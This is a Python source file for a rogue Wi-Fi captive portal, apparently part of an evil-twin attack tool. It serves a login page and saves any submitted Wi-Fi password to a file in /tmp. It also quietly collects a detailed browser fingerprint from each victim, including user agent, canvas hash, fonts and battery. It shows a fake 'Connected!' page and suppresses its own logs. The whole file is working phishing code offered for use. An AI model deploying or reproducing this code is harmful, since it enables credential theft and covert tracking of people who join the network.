#!/usr/bin/env python3

import http.server
import urllib.parse
import os
import sys
import json
import datetime

PORTAL_DIR       = os.path.dirname(os.path.abspath(__file__))
CAPTURE_FILE     = "/tmp/wificli_captured.txt"
FINGERPRINT_FILE = "/tmp/wificli_fingerprint.txt"
# Use IP from argument or default to 192.168.1.1
PORTAL_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.1"

# Human-readable label order for fingerprint display
_FP_LABEL_ORDER = [
    "User Agent", "Platform", "Language", "Timezone",
    "Screen", "Viewport", "Pixel Ratio", "Touch Points",
    "CPU Cores", "Memory GB", "Do Not Track",
    "Connection", "Battery",
    "Canvas FP", "Fonts",
]

SUCCESS_HTML = b"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Connected</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 50px 40px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        .check { font-size: 60px; margin-bottom: 16px; }
        h2 { color: #1a1a1a; margin-bottom: 8px; }
        p  { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="check">&#x2705;</div>
        <h2>Connected!</h2>
        <p>Reconnecting to the network...</p>
    </div>
</body>
</html>"""


class PortalHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        self._serve_portal()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode(errors="replace")

        if self.path == "/fingerprint":
            self._handle_fingerprint(body)
        else:
            self._handle_connect(body)

    def _handle_connect(self, body):
        params   = urllib.parse.parse_qs(body)
        password = params.get("password", [""])[0].strip()

        if password:
            with open(CAPTURE_FILE, "w") as f:
                f.write(password)

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(SUCCESS_HTML)

    def _handle_fingerprint(self, body):
        """Receive JSON browser fingerprint from the page JS and write to file."""
        try:
            data = json.loads(body)
            ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(FINGERPRINT_FILE, "w") as f:
                f.write(f"Captured\t{ts}\n")
                # Write ordered known keys first
                for label in _FP_LABEL_ORDER:
                    if label in data:
                        val = str(data[label]).replace("\t", " ").replace("\n", " ")[:300]
                        f.write(f"{label}\t{val}\n")
                # Then any extra keys the JS added that aren't in the order list
                for key, val in data.items():
                    if key not in _FP_LABEL_ORDER:
                        k = str(key).replace("\t", " ")[:40]
                        v = str(val).replace("\t", " ").replace("\n", " ")[:300]
                        f.write(f"{k}\t{v}\n")
        except Exception:
            pass

        # 204 No Content — silent response, browser ignores it
        self.send_response(204)
        self.end_headers()

    def _serve_portal(self):
        try:
            with open(os.path.join(PORTAL_DIR, "index.html"), "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()

    # Redirect everything to portal
    def do_HEAD(self):
        self._redirect()

    def _redirect(self):
        self.send_response(302)
        self.send_header("Location", f"http://{PORTAL_IP}/")
        self.end_headers()

    def log_message(self, fmt, *args):
        pass  # suppress access logs


if __name__ == "__main__":
    server = http.server.HTTPServer((PORTAL_IP, 80), PortalHandler)
    server.serve_forever()
